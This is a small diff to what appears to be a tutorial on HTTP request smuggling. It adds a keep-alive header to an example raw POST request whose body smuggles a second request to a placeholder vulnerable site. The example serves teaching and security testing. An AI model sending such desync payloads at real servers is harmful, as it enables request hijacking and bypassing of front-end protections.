@@ -92,6 +92,7 @@ Transfer-Encoding
 ```
 POST / HTTP/1.1
 Host: vulnerable-website.com
+Connection: keep-alive
 Content-Length: 3
 
 xyzGET / HTTP/1.1
